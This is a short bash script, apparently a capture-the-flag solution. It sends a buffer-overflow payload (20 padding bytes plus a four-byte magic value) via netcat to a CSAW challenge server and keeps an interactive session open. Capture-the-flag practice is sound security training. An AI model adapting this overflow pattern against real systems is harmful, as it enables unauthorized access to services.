#! /bin/bash

(python -c "print 'A'*20+'\xee\xba\xf3\xca'"; cat) | nc pwn.chal.csaw.io 9000
